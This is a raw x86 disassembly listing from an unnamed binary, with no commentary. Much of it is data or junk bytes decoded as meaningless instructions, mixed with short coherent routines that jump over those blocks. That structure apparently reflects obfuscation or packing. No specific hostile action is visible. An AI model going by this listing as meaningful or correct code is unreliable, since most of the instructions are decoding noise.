  412195:	in     al,0x1b
  412197:	xchg   ecx,eax
  412198:	mov    bh,0x6d
  41219a:	call   0x3a76ef62
  41219f:	sub    eax,0x926e4a9b
  4121a4:	dec    esi
  4121a5:	sar    dl,0x7b
  4121a8:	je     0x4121fd
  4121aa:	cmc    
  4121ab:	sbb    bl,BYTE PTR [ebx+esi*2]
  4121ae:	adc    eax,ecx
  4121b0:	lahf   
  4121b1:	(bad)
  4121b5:	mov    edx,esi
  4121b7:	loope  0x412163
  4121b9:	test   eax,esp
  4121bb:	sub    al,0xca
  4121bd:	inc    edi
  4121be:	and    BYTE PTR [ebp+0x7c],cl
  4121c1:	arpl   WORD PTR [ebp+0x44],ax
  4121c4:	fs js  0x41215f
  4121c7:	adc    al,0x93
  4121c9:	mov    al,ds:0x6c029c2f
  4121ce:	add    al,0x19
  4121d0:	push   eax
  4121d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4121d2:	(bad)  
  4121d3:	push   0x98dff04
  4121d8:	mov    ch,0xb1
  4121da:	out    0x60,al
  4121dc:	mov    ds:0x3d16a36b,al
  4121e1:	rcl    ecx,0x7e
  4121e4:	std    
  4121e5:	xchg   esp,eax
  4121e6:	inc    ebp
  4121e7:	sti    
  4121e8:	ins    DWORD PTR es:[edi],dx
  4121e9:	jp     0x4121f5
  4121eb:	add    DWORD PTR [ecx-0x1a7389bd],esp
  4121f1:	add    eax,0xa88abed0
  4121f6:	sbb    edx,ecx
  4121f8:	arpl   WORD PTR [esi+eax*8-0x66],bx
  4121fc:	mov    bl,0xda
  4121fe:	mov    ch,0xa
  412200:	inc    ecx
  412201:	xor    dl,BYTE PTR [ecx+0x1b9740e8]
  412207:	cmp    DWORD PTR [edi-0x33],esp
  41220a:	in     eax,dx
  41220b:	aas    
  41220c:	push   ecx
  41220d:	push   0xe4c37b20
  412212:	xor    eax,0x3884
  412217:	mov    eax,DWORD PTR [eax+edx*1]
  41221a:	lea    ecx,[eax+ecx*1-0x27c6df8a]
  412221:	mov    eax,DWORD PTR [ebp-0x34]
  412224:	mov    edx,DWORD PTR [ebp-0xb4]
  41222a:	lea    eax,[edx+eax*1-0x76d2]
  412231:	mov    edx,DWORD PTR [ebp-0x44]
  412234:	mov    esi,DWORD PTR [ebp-0x84]
  41223a:	or     eax,edx
  41223c:	xor    edx,edx
  41223e:	div    esi
  412240:	mov    edx,DWORD PTR [ebp-0x54]
  412243:	add    eax,0x43d7
  412248:	xor    eax,0x5e6a
  41224d:	add    eax,DWORD PTR [edx+ecx*1]
  412250:	mov    ecx,DWORD PTR ds:0x4225dc
  412256:	add    DWORD PTR [eax],ecx
  412258:	mov    eax,DWORD PTR [ebp-0x90]
  41225e:	mov    ecx,DWORD PTR [ebp-0x8c]
  412264:	mov    edx,DWORD PTR [ebp-0xa0]
  41226a:	mov    esi,DWORD PTR [ebp-0x9c]
  412270:	sub    edx,eax
  412272:	mov    eax,DWORD PTR [ebp-0xb0]
  412278:	sbb    esi,ecx
  41227a:	mov    ecx,DWORD PTR [ebp-0xac]
  412280:	xor    edx,eax
  412282:	mov    eax,DWORD PTR [ebp-0xc0]
  412288:	xor    esi,ecx
  41228a:	mov    ecx,DWORD PTR [ebp-0xbc]
  412290:	jmp    0x412505
  412295:	mov    ah,0x74
  412297:	xchg   edx,eax
  412298:	cli    
  412299:	push   edx
  41229a:	fistp  DWORD PTR [edx+ebx*1]
  41229d:	cs jge 0x4122b6
  4122a0:	stos   BYTE PTR es:[edi],al
  4122a1:	or     al,dh
  4122a3:	scas   eax,DWORD PTR es:[edi]
  4122a4:	mov    al,0xfe
  4122a6:	pusha  
  4122a7:	sbb    BYTE PTR [eax],bl
  4122a9:	jno    0x4122bf
  4122ab:	sbb    BYTE PTR [eax],bl
  4122ad:	add    DWORD PTR [esp+esi*2+0x31],edi
  4122b1:	mov    ds:0x85cbcab4,eax
  4122b6:	pop    eax
  4122b7:	cld    
  4122b8:	test   al,0xf3
  4122ba:	sub    al,0xc2
  4122bc:	outs   dx,DWORD PTR ds:[esi]
  4122bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122be:	push   edx
  4122bf:	cmc    
  4122c0:	mov    edx,esp
  4122c2:	loop   0x41230e
  4122c4:	dec    ebx
  4122c5:	popf   
  4122c6:	cmp    DWORD PTR [ebx+0x3],ecx
  4122c9:	xor    BYTE PTR [ecx+0x6b10ce07],0x67
  4122d0:	mov    ecx,0x34ae70e2
  4122d5:	pop    esi
  4122d6:	je     0x41232e
  4122d8:	imul   edi,DWORD PTR [ebx],0xec2a9fb6
  4122de:	icebp  
  4122df:	jmp    0xbcd5:0x879b1444
  4122e6:	in     al,0x75
  4122e8:	gs loop 0x4122d6
  4122eb:	sti    
  4122ec:	cwde   
  4122ed:	iret   
  4122ee:	fwait
  4122ef:	sahf   
  4122f0:	in     al,dx
  4122f1:	cmp    bl,ah
  4122f3:	xor    al,0x88
  4122f5:	sbb    eax,DWORD PTR [eax]
  4122f7:	in     al,0x1b
  4122f9:	pop    ebp
  4122fa:	jl     0x412289
  4122fc:	in     eax,0xc2
  4122fe:	ins    BYTE PTR es:[edi],dx
  4122ff:	or     DWORD PTR [esi-0x62],edi
  412302:	rcr    DWORD PTR [eax-0x3a7ebd0],0x8a
  412309:	push   ebx
  41230a:	cli    
  41230b:	arpl   dx,dx
  41230d:	pop    ebx
  41230e:	jns    0x41233e
  412310:	push   eax
  412311:	out    0xb3,eax
  412313:	lahf   
  412314:	xlat   BYTE PTR ds:[ebx]
  412315:	cmp    ah,ah
  412317:	mov    dx,0x94a5
  41231b:	clc    
  41231c:	int3   
  41231d:	lea    ebx,[ebp+0x9]
  412320:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412321:	push   ebp
  412322:	fcomp  QWORD PTR [ebp-0x34]
  412325:	hlt    
  412326:	mov    eax,0x77bd189d
  41232b:	jns    0x412390
  41232d:	mov    ecx,0xc3ff464
  412332:	jo     0x41232e
  412334:	out    0x5b,eax
  412336:	(bad)  
  412338:	sbb    eax,0xf294ad5a
  41233d:	jae    0x41231c
  41233f:	xchg   esi,eax
  412340:	shl    BYTE PTR gs:[esi],1
  412343:	stos   DWORD PTR es:[edi],eax
  412344:	pop    ebx
  412345:	or     esp,ecx
  412347:	jb     0x41234d
  412349:	mov    al,0x42
  41234b:	call   0xf8c2:0x718896a8
  412352:	cmp    eax,edi
  412354:	call   0xac32:0x293b7e77
  41235b:	push   esp
  41235c:	jmp    DWORD PTR [ebp+0x5180b1db]
  412362:	sar    esp,1
  412364:	pushf  
  412365:	inc    edx
  412366:	int3   
  412367:	add    ah,dh
  412369:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41236a:	sbb    BYTE PTR [ebp-0x1f67863f],ah
  412370:	je     0x412366
  412372:	out    0xec,eax
  412374:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412375:	(bad)
  412379:	jmp    0x9ea2:0x29cbafa4
  412380:	inc    ebx
  412381:	xor    eax,0x7be80e35
  412386:	and    al,0x87
  412388:	mov    cs,edi
  41238a:	mov    ebp,0xf48485f9
  41238f:	cwde   
  412390:	aaa    
  412391:	sub    eax,0xbfb7b41f
  412396:	push   ebx
  412397:	pop    ecx
  412398:	xor    eax,0xb764ce77
  41239d:	xor    esp,DWORD PTR ds:[ebp-0x527aa81]
  4123a4:	sbb    al,0xbc
  4123a6:	(bad)  
  4123a7:	(bad)  
  4123a8:	jle    0x412348
  4123aa:	dec    eax
  4123ab:	popf   
  4123ac:	xchg   ebx,eax
  4123ad:	push   ebp
  4123ae:	push   ebp
  4123af:	repz popf 
  4123b1:	jmp    0x4123ec
  4123b3:	sahf   
  4123b4:	call   0x33e0:0xdc6703f2
  4123bb:	sahf   
  4123bc:	ret    
  4123bd:	xor    al,0xfe
  4123bf:	sub    BYTE PTR [edi-0x4182dd02],dl
  4123c5:	cmp    cl,BYTE PTR [ebx+0x678a3e36]
  4123cb:	cmp    al,bh
  4123cd:	dec    esp
  4123ce:	daa    
  4123cf:	push   0x4b
  4123d1:	xchg   edx,eax
  4123d2:	jbe    0x4123b6
  4123d4:	sub    eax,0x9e1d38e7
  4123d9:	xor    cl,cl
  4123db:	xchg   ebp,eax
  4123dc:	xor    eax,0x634a44fd
  4123e2:	ins    BYTE PTR es:[edi],dx
  4123e3:	jb     0x4123f0
  4123e5:	cmp    cl,BYTE PTR [eax+edx*2-0x58090d37]
  4123ec:	xor    al,0x2a
  4123ee:	ret    0x5a5e
  4123f1:	jmp    FWORD PTR [edx-0x13]
  4123f4:	cld    
  4123f5:	lock (bad) 
  4123f7:	sub    eax,0x43e2a28a
  4123fc:	and    DWORD PTR [eax-0x7d],eax
  4123ff:	and    BYTE PTR [edx-0x6e],ah
  412402:	mov    dh,0xb2
  412404:	inc    edx
  412405:	ds push cs
  412407:	nop
  412408:	clc    
  412409:	and    dh,BYTE PTR [edi+0x5836da7e]
  41240f:	loope  0x41248d
  412411:	xchg   ecx,eax
  412412:	jno    0x412409
  412414:	push   ss
  412415:	xchg   esp,eax
  412416:	mov    esi,DWORD PTR [ebp-0x4]
  412419:	add    dl,cl
  41241b:	es jnp 0x4123d0
  41241e:	and    ecx,DWORD PTR [edi]
  412420:	iret   
  412421:	cmp    eax,0x99ca8183
  412426:	cs and BYTE PTR ds:[ecx*1+0x7042879a],ah
  41242f:	adc    ebx,ecx
  412431:	imul   edx,DWORD PTR [eax+0x53ca97d0],0x29
  412438:	test   eax,0x47692a34
  41243d:	xlat   BYTE PTR ds:[ebx]
  41243e:	pop    ebx
  41243f:	add    al,bh
  412441:	ret    0xf27c
  412444:	mov    esp,0x473d410d
  412449:	mov    ah,0x9
  41244b:	je     0x4124c5
  41244d:	lahf   
  41244e:	test   eax,0xdd3b7081
  412453:	clc    
  412454:	arpl   WORD PTR [esi+0x44412c76],bp
  41245a:	adc    cl,ah
  41245c:	pop    ebp
  41245d:	loopne 0x4124dd
  41245f:	xor    al,0x20
  412461:	sti    
  412462:	push   ds
  412463:	or     al,0x32
  412465:	std    
  412466:	dec    esp
  412467:	int3   
  412468:	sahf   
  412469:	jecxz  0x41249e
  41246b:	xlat   BYTE PTR ds:[ebx]
  41246c:	push   0xf3fb4d3e
  412471:	mov    ebx,0xe13d9c10
  412476:	(bad)  
  412477:	adc    al,0xe5
  412479:	dec    eax
  41247a:	(bad)  
  41247b:	(bad)  
  41247c:	pop    eax
  41247d:	push   0x9a210787
  412482:	mov    bh,0xa4
  412484:	mov    ebp,0x3f289ced
  412489:	in     eax,0x56
  41248b:	mov    ah,0x23
  41248d:	jge    0x4124ab
  41248f:	sbb    DWORD PTR [edi+0x3f],esi
  412492:	and    DWORD PTR [ebx],edi
  412494:	ror    DWORD PTR [ebx+0x26d4e141],cl
  41249a:	(bad)  
  41249b:	aas    
  41249c:	gs inc esp
  41249e:	cmp    ecx,DWORD PTR [edx-0x12566cf5]
  4124a4:	sbb    bh,BYTE PTR [ecx+0x66]
  4124a7:	add    al,0x7e
  4124a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4124aa:	aaa    
  4124ab:	enter  0x864a,0x9
  4124af:	(bad)  
  4124b0:	jmp    0x4124bf
  4124b2:	and    esi,0xa32510f
  4124b8:	call   0x4800dcdf
  4124bd:	push   ss
  4124be:	inc    al
  4124c0:	pop    esi
  4124c1:	test   ch,ah
  4124c3:	cmc    
  4124c4:	jl     0x412463
  4124c6:	(bad)  
  4124c8:	jns    0x412521
  4124ca:	and    eax,0x9174813a
  4124cf:	mov    cl,0xec
  4124d1:	imul   ecx,DWORD PTR [eax],0xffffffe7
  4124d4:	jb     0x4124ff
  4124d6:	pusha  
  4124d7:	sub    ebp,DWORD PTR [ebx-0x711af3f7]
  4124dd:	popa   
  4124de:	xchg   esi,eax
  4124df:	(bad)  
  4124e0:	enter  0xf87,0x3a
  4124e4:	or     eax,0x12a15f74
  4124e9:	repz cmp dh,dh
  4124ec:	test   DWORD PTR [edx-0x478f9a07],edi
  4124f2:	add    BYTE PTR [ebx-0x9f9eddd],dl
  4124f8:	jg     0x4124a2
  4124fa:	adc    al,0x31
  4124fc:	int3   
  4124fd:	(bad)  
  4124fe:	mov    ds,WORD PTR [ecx-0x5505ebb]
  412504:	pop    ss
  412505:	add    edx,eax
  412507:	adc    esi,ecx
  412509:	add    edx,0x2313
  41250f:	adc    esi,0x2a00
  412515:	push   esi
  412516:	push   edx
  412517:	call   0x42205c
  41251c:	mov    ecx,0x1207
  412521:	sub    ecx,eax
  412523:	push   0x0
  412525:	pop    eax
  412526:	jmp    0x41279b
  41252b:	jae    0x41252c
  41252d:	mov    dl,0xf5
  41252f:	sbb    bl,BYTE PTR [ebx+esi*1-0x74c2fe82]
  412536:	jo     0x41255a
  412538:	or     BYTE PTR [ecx-0x50],dh
  41253b:	push   edi
  41253c:	pop    esp
  41253d:	sbb    BYTE PTR [eax],bl
  41253f:	jno    0x412555
  412541:	sbb    BYTE PTR [eax],bl
  412543:	cdq    
  412544:	sahf   
  412545:	ins    DWORD PTR es:[edi],dx
  412546:	das    
  412547:	popa   
  412548:	jb     0x41258d
  41254a:	push   ecx
  41254b:	int3   
  41254c:	mov    ecx,0xd577952
  412551:	outs   dx,DWORD PTR ds:[esi]
  412552:	and    edx,ebp
  412554:	aad    0x41
  412556:	mov    ch,0xb2
  412558:	jbe    0x4125b4
  41255a:	push   esp
  41255b:	not    BYTE PTR [edi+ebx*1+0x7cf905e1]
  412562:	pop    ebp
  412563:	mov    esp,0x59da176f
  412568:	cmp    bh,BYTE PTR [esi]
  41256a:	mov    ds,WORD PTR [eax]
  41256c:	xor    al,0xc8
  41256e:	sub    BYTE PTR cs:[eax+0x441dfb8d],dl
  412575:	cmc    
  412576:	sbb    esi,DWORD PTR [ebx-0x2d320faf]
  41257c:	nop
  41257d:	sti    
  41257e:	jge    0x41257a
  412580:	ret    0x5637
  412583:	add    al,0x7c
  412585:	xchg   BYTE PTR [edi+0x1806d5b0],bl
  41258b:	cmp    BYTE PTR [edi],0xfb
  41258e:	rcr    BYTE PTR [edi-0x59ef01cb],1
  412594:	cmc    
  412595:	mov    BYTE PTR [ecx-0x50],ch
  412598:	xchg   esp,eax
  412599:	xchg   ebp,eax
  41259a:	bound  edx,QWORD PTR [eax+0x37]
  41259d:	mov    ds:0xa21def1d,al
  4125a2:	ret    
  4125a3:	add    BYTE PTR ds:0x5dd124c2,ch
  4125a9:	dec    ebp
  4125aa:	mov    DWORD PTR [edi-0x52],edx
  4125ad:	mov    cl,0x37
  4125af:	mov    edx,0xe9695451
  4125b4:	jp     0x41259a
  4125b6:	arpl   WORD PTR [esi],cx
  4125b8:	in     al,dx
  4125b9:	iret   
  4125ba:	mov    ds:0x879901eb,al
  4125bf:	jle    0x4125c8
  4125c1:	test   al,0xbf
  4125c3:	ins    BYTE PTR es:[edi],dx
  4125c4:	sub    eax,0xb410438c
  4125c9:	xor    DWORD PTR [esp+ebp*8],esi
  4125cc:	mov    bl,0x16
  4125ce:	sbb    al,BYTE PTR [ebx+esi*8+0x7269d00e]
  4125d5:	sbb    al,0x57
  4125d7:	aam    0x19
  4125d9:	fucom  st(1)
  4125db:	push   ecx
  4125dc:	pop    ecx
  4125dd:	dec    edi
  4125de:	in     al,dx
  4125df:	jecxz  0x4125f5
  4125e1:	retf   
  4125e2:	mov    ah,0x2f
  4125e4:	jns    0x4125a8
  4125e6:	rcr    DWORD PTR [ecx+0xda6bbca],cl
  4125ec:	mov    cl,0xc
  4125ee:	rcl    BYTE PTR [ecx+edx*8+0xe6a0342],cl
  4125f5:	jecxz  0x412666
  4125f7:	dec    ebp
  4125f8:	out    dx,eax
  4125f9:	inc    ebx
  4125fa:	bound  ecx,QWORD PTR [eax+0x43a2a166]
  412600:	in     eax,0x2f
  412602:	mov    ds:0x3bcf3e9f,eax
  412607:	cli    
  412608:	aas    
  412609:	nop
  41260a:	mov    ds:0xfb1d14b5,al
  41260f:	popf   
  412610:	pop    ebx
  412611:	and    dh,dl
  412613:	sbb    al,0xdd
  412615:	pop    ebx
  412616:	ror    esi,cl
  412618:	cmp    dl,bh
  41261a:	repnz retf 
  41261c:	add    ebx,DWORD PTR [esi-0x57]
  41261f:	jl     0x4125fd
  412621:	cmp    al,0x39
  412623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412624:	inc    edi
  412625:	enter  0x2559,0x33
  412629:	mov    edi,0x97a98283
  41262e:	(bad)  
  41262f:	mov    bl,0xec
  412631:	push   ss
  412632:	scas   al,BYTE PTR es:[edi]
  412633:	imul   ebx,DWORD PTR [ebp-0x6d6e428c],0x6c
  41263a:	inc    ecx
  41263b:	sub    cl,BYTE PTR [eax+ebp*2]
  41263e:	or     al,0xb5
  412640:	pushf  
  412641:	cld    
  412642:	jne    0x412668
  412644:	or     eax,0x3d37bd67
  412649:	sbb    eax,edi
  41264b:	xlat   BYTE PTR ds:[ebx]
  41264c:	xchg   esp,eax
  41264d:	mov    ebp,0x6c98d667
  412652:	(bad)  
  412654:	xchg   edx,eax
  412655:	enter  0xc50e,0xcd
  412659:	or     DWORD PTR [ebp+ebx*2+0x7b],esi
  41265d:	cdq    
  41265e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41265f:	das    
  412660:	cwde   
  412661:	add    al,0x6c
  412663:	jl     0x4125fc
  412665:	sbb    esp,DWORD PTR [edx-0x6c495aeb]
  41266b:	call   0xc8a16ba5
  412670:	scas   al,BYTE PTR es:[edi]
  412671:	add    DWORD PTR [ecx-0x50],esi
  412674:	jle    0x412620
  412676:	jb     0x412613
  412678:	ret    
  412679:	repnz pop ds
  41267b:	or     eax,esi
  41267d:	out    0x6f,eax
  41267f:	add    bl,BYTE PTR [edx-0x47]
  412682:	outs   dx,BYTE PTR ds:[esi]
  412683:	fwait
  412684:	xchg   ebx,eax
  412685:	ficomp WORD PTR [edi-0x4f657467]
  41268b:	cmp    BYTE PTR [esi-0x66],0x1a
  41268f:	outs   dx,DWORD PTR ds:[esi]
  412690:	xor    eax,0x654eae6f
  412695:	mov    ebp,0x63d62864
  41269a:	sahf   
  41269b:	xchg   esp,eax
  41269c:	push   esp
  41269d:	mov    cl,0xce
  41269f:	popa   
  4126a0:	shl    DWORD PTR [esi+0x649ca74],cl
  4126a6:	dec    ebx
  4126a7:	div    BYTE PTR [esi+0x33]
  4126aa:	adc    eax,DWORD PTR [esi+0xd]
  4126ad:	icebp  
  4126ae:	std    
  4126af:	inc    eax
  4126b0:	adc    al,0xfb
  4126b2:	add    dh,BYTE PTR [ebx+0x66]
  4126b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126b6:	ins    DWORD PTR es:[edi],dx
  4126b7:	pushf  
  4126b8:	cdq    
  4126b9:	gs pop eax
  4126bb:	add    ebp,DWORD PTR [ebp+0x74]
  4126be:	sbb    eax,0x547db9a0
  4126c3:	pop    ss
  4126c4:	xchg   edi,eax
  4126c5:	and    BYTE PTR [edi-0x2d],al
  4126c8:	adc    ah,BYTE PTR [ebx]
  4126ca:	cmp    ah,BYTE PTR [ebx+0x155e767f]
  4126d0:	or     al,0x10
  4126d2:	cwde   
  4126d3:	sahf   
  4126d4:	imul   esp,edx,0x8e42726a
  4126da:	or     ch,BYTE PTR [ebx-0x419227e7]
  4126e0:	mov    esi,0xcf5b3cdf
  4126e5:	int3   
  4126e6:	mov    WORD PTR [edx],ss
  4126e8:	push   cs
  4126e9:	shl    BYTE PTR [edx],cl
  4126eb:	jo     0x4126af
  4126ed:	cmp    ebp,ebp
  4126ef:	dec    esi
  4126f0:	mov    bl,0x6a
  4126f2:	pop    eax
  4126f3:	push   esi
  4126f4:	mov    ds:0x31b3355a,eax
  4126f9:	or     eax,0x3bb0d78c
  4126fe:	dec    edi
  4126ff:	out    0x9,al
  412701:	mov    ds,WORD PTR [esi-0x33c36ff2]
  412707:	in     al,0x36
  412709:	adc    DWORD PTR [edi+0x6d861d56],edx
  41270f:	retf   0x9b8b
  412712:	inc    eax
  412713:	imul   ecx,DWORD PTR ds:0x5147a08a,0x43
  41271a:	int    0xe8
  41271c:	mov    dl,0xd0
  41271e:	rcl    BYTE PTR [edx+0x155cd60f],1
  412724:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412725:	jb     0x4126b3
  412727:	loopne 0x412707
  412729:	add    al,0xc6
  41272b:	ret    
  41272c:	loope  0x412717
  41272e:	xchg   ebx,eax
  41272f:	jae    0x412780
  412731:	cld    
  412732:	mov    edi,0x1c77fafe
  412737:	sahf   
  412738:	push   ecx
  412739:	lea    ecx,[edi+0x7a]
  41273c:	mov    eax,0xf8796ad5
  412741:	jbe    0x412797
  412743:	jae    0x4126da
  412745:	loopne 0x4126ee
  412747:	and    ecx,DWORD PTR [ebx-0x58ef9901]
  41274d:	pop    ecx
  41274e:	dec    eax
  41274f:	les    eax,FWORD PTR [ecx-0x69f669af]
  412755:	cdq    
  412756:	test   DWORD PTR [edi-0x77a826c4],0xf836f4ed
  412760:	rol    BYTE PTR [ebx-0x26],cl
  412763:	push   esp
  412764:	mov    ch,0xb3
  412766:	stos   BYTE PTR es:[edi],al
  412767:	retf   
  412768:	scas   al,BYTE PTR es:[edi]
  412769:	jmp    0x412779
  41276b:	not    BYTE PTR [edx]
  41276d:	mov    bh,BYTE PTR [ecx+0x2d07b2c4]
  412773:	and    BYTE PTR [ebx+0x56027fe1],al
  412779:	lds    edi,FWORD PTR [ebx]
  41277b:	popf   
  41277c:	jp     0x412746
  41277e:	jecxz  0x41274a
  412780:	dec    ebp
  412781:	aam    0x74
  412783:	div    BYTE PTR [edx-0x41]
  412786:	in     al,dx
  412787:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412788:	mov    esi,0x63783fe7
  41278d:	arpl   WORD PTR [edx-0x302001f2],dx
  412793:	cli    
  412794:	sahf   
  412795:	ret    
  412796:	lods   al,BYTE PTR ds:[esi]
  412797:	dec    ebp
  412798:	rol    cl,0xc9
  41279b:	sbb    eax,edx
  41279d:	mov    edx,DWORD PTR ds:0x4225dc
  4127a3:	xor    esi,esi
  4127a5:	cmp    edx,ecx
  4127a7:	jne    0x4127da
  4127ad:	cmp    esi,eax
  4127af:	jne    0x4127da
  4127b5:	mov    eax,DWORD PTR [ebp-0x4]
  4127b8:	mov    ecx,DWORD PTR [ebp-0x8]
  4127bb:	add    eax,0x4296
  4127c0:	shr    eax,0x2
  4127c3:	or     eax,ecx
  4127c5:	mov    ecx,DWORD PTR [ebp-0x10]
  4127c8:	xor    eax,ecx
  4127ca:	xor    eax,0x4e94
  4127cf:	add    eax,DWORD PTR ds:0x4225dc
  4127d5:	mov    ds:0x4225e4,eax
  4127da:	pop    esi
  4127db:	leave  
  4127dc:	ret    0x4
  4127df:	push   ebp
  4127e0:	mov    ebp,esp
  4127e2:	sub    esp,0x58
  4127e5:	push   ebx
  4127e6:	push   esi
  4127e7:	push   edi
  4127e8:	mov    DWORD PTR [ebp-0x58],0x3082
  4127ef:	mov    DWORD PTR [ebp-0x54],0x37a2
  4127f6:	mov    DWORD PTR [ebp-0x50],0x49d6
  4127fd:	mov    DWORD PTR [ebp-0x4c],0x6390
  412804:	mov    DWORD PTR [ebp-0x48],0x40f2
  41280b:	mov    DWORD PTR [ebp-0x44],0x21d4
  412812:	mov    DWORD PTR [ebp-0x28],0x4726
  412819:	mov    DWORD PTR [ebp-0x24],0x221a
  412820:	mov    DWORD PTR [ebp-0x30],0x768c
  412827:	mov    DWORD PTR [ebp-0x2c],0x29e8
  41282e:	mov    DWORD PTR [ebp-0x40],0x6cf6
  412835:	mov    DWORD PTR [ebp-0x3c],0x94c
  41283c:	mov    DWORD PTR [ebp-0x38],0x4797
  412843:	mov    DWORD PTR [ebp-0x34],0x4439
  41284a:	mov    DWORD PTR [ebp-0x20],0x2531
  412851:	mov    esi,0x5a3e
  412856:	mov    DWORD PTR [ebp-0x1c],esi
  412859:	mov    DWORD PTR [ebp-0x18],0x2e83e7a
  412860:	mov    DWORD PTR [ebp-0x14],0x7
  412867:	mov    DWORD PTR [ebp-0x10],0xe3a
  41286e:	mov    DWORD PTR [ebp-0xc],0x6a6e
  412875:	mov    DWORD PTR [ebp-0x8],0x6b99
  41287c:	mov    DWORD PTR [ebp-0x4],0x2acd
  412883:	mov    eax,DWORD PTR [ebp-0x10]
  412886:	mov    ecx,DWORD PTR [ebp-0xc]
  412889:	mov    eax,DWORD PTR [ebp-0x8]
  41288c:	mov    ecx,DWORD PTR [ebp-0x4]
  41288f:	mov    eax,DWORD PTR [ebp-0x18]
  412892:	mov    ecx,DWORD PTR [ebp-0x14]
  412895:	jmp    0x412c6d
  41289a:	icebp  
  41289b:	not    esi
  41289d:	xchg   ecx,eax
  41289e:	into   
  41289f:	xor    DWORD PTR [esi],ebp
  4128a1:	jbe    0x4128b2
  4128a3:	cmc    
  4128a4:	gs mov esp,0xaa14f745
  4128aa:	scas   al,BYTE PTR es:[edi]
  4128ab:	pop    eax
  4128ac:	sbb    BYTE PTR [eax],bl
  4128ae:	stos   BYTE PTR es:[edi],al
  4128af:	adc    bl,BYTE PTR [eax]
  4128b1:	sbb    BYTE PTR [eax],dl
  4128b3:	bound  eax,QWORD PTR [eax]
  4128b5:	sub    DWORD PTR [ecx+0x540d96fa],edi
  4128bb:	mov    bh,0xd5
  4128bd:	push   edx
  4128be:	pop    ecx
  4128bf:	loope  0x4128ac
  4128c1:	data16 data16 jae 0x41293d
  4128c5:	or     DWORD PTR [edx+ebx*8],esp
  4128c8:	std    
  4128c9:	mov    ecx,0x4143fb42
  4128ce:	out    dx,al
  4128cf:	inc    esi
  4128d0:	loop   0x4128bf
  4128d2:	jo     0x41291e
  4128d4:	inc    eax
  4128d5:	lods   al,BYTE PTR ds:[esi]
  4128d6:	xchg   ecx,eax
  4128d7:	inc    ebp
  4128d8:	jl     0x41288b
  4128da:	push   esi
  4128db:	inc    esi
  4128dc:	cdq    
  4128dd:	retf   0x2337
  4128e0:	sbb    bh,BYTE PTR [edi+0x782cee1f]
  4128e6:	aam    0x8d
  4128e8:	jmp    0x66e4:0x74474831
  4128ef:	adc    eax,0x6476cb0e
  4128f4:	imul   edx,DWORD PTR [edi],0xa
  4128f7:	xor    edi,DWORD PTR [ecx-0x7351ca42]
  4128fd:	not    esi
  4128ff:	or     eax,0x88aae64d
  412904:	xchg   esp,eax
  412905:	daa    
  412906:	(bad)  ds:0x3d87896
  41290c:	pop    ss
  41290d:	aam    0x2f
  41290f:	sub    bl,BYTE PTR [ebx-0x13]
  412912:	int    0x67
  412914:	popf   
  412915:	xchg   esp,eax
  412916:	pop    eax
  412917:	in     eax,0xd4
  412919:	sub    cl,BYTE PTR [ecx+0x3937204d]
  41291f:	or     eax,DWORD PTR [esi]
  412921:	jb     0x412940
  412923:	sbb    BYTE PTR gs:[eax+eiz*8+0x58],bh
  412928:	and    esp,esi
  41292a:	iret   
  41292b:	(bad)  
  41292d:	or     al,0x4e
  41292f:	cwde   
  412930:	neg    BYTE PTR [esi]
  412932:	int    0x81
  412934:	and    BYTE PTR [ecx+0x166f6bec],ah
  41293a:	(bad)  
  41293b:	xchg   edi,eax
  41293c:	adc    al,0x77
  41293e:	int3   
  41293f:	jecxz  0x41292a
  412941:	ret    0xf0e8
  412944:	rol    DWORD PTR [ebp+eiz*2+0x1],0x1f
  412949:	js     0x412997
  41294b:	mov    ch,0x82
  41294d:	je     0x4129bb
  41294f:	stc    
  412950:	cs in  eax,dx
  412952:	dec    esi
  412953:	push   DWORD PTR [ebx+0x1fc95654]
  412959:	push   cs
  41295a:	add    eax,0x4c88f46c
  41295f:	mov    bh,0xec
  412961:	aaa    
  412962:	(bad)  [eax-0x65166bb2]
  412968:	xchg   esp,eax
  412969:	fstp   DWORD PTR [esi-0x168507e]
  41296f:	push   cs
  412970:	push   eax
  412971:	jmp    0x19436814
  412976:	(bad)  
  412977:	jbe    0x412987
  412979:	daa    
  41297a:	mov    BYTE PTR [edx-0x57cbef79],0xf8
  412981:	sbb    ebp,DWORD PTR [esi]
  412983:	push   ecx
  412984:	in     al,0x28
  412986:	in     eax,0x2
  412988:	retf   
  412989:	lea    esp,[edx+0x3a]
  41298c:	mov    eax,ds:0x32e6ec27
  412991:	scas   al,BYTE PTR es:[edi]
  412992:	scas   al,BYTE PTR es:[edi]
  412993:	rcr    DWORD PTR [ebx],cl
  412995:	mov    bl,BYTE PTR [edx]
  412997:	mov    esp,0xb95e7318
  41299c:	xchg   ecx,eax
  41299d:	dec    BYTE PTR [esi]
  41299f:	mov    dl,0xd7
  4129a1:	cmp    eax,0x98195e22
  4129a6:	push   edx
  4129a7:	hlt    
  4129a8:	push   ss
  4129a9:	stos   DWORD PTR es:[edi],eax
  4129aa:	push   ds
  4129ab:	push   0x7d410db5
  4129b0:	fwait
  4129b1:	es sub eax,0xe2f05630
  4129b7:	sbb    BYTE PTR [edi],0xa
  4129ba:	adc    cl,BYTE PTR [esi]
  4129bc:	dec    ebp
  4129bd:	sub    DWORD PTR ds:0xe6a5a9ff,edx
  4129c3:	mov    ds:0xf397c033,al
  4129c8:	cwde   
  4129c9:	call   0x1561:0xdcba7f0b
  4129d0:	ins    BYTE PTR es:[edi],dx
  4129d1:	jecxz  0x412a23
  4129d3:	xchg   esi,eax
  4129d4:	sub    eax,0xdcc390dc
  4129d9:	add    eax,0xb18eb409
  4129de:	push   ebx
  4129df:	test   DWORD PTR [ebx+0x72d0c0ff],esi
  4129e5:	xor    BYTE PTR [eax+0x4f6f7c00],0x81
  4129ec:	mov    dl,0x88
  4129ee:	out    0x47,al
  4129f0:	test   eax,0x7413f9cf
  4129f5:	and    DWORD PTR [ebp+0x29e46033],esp
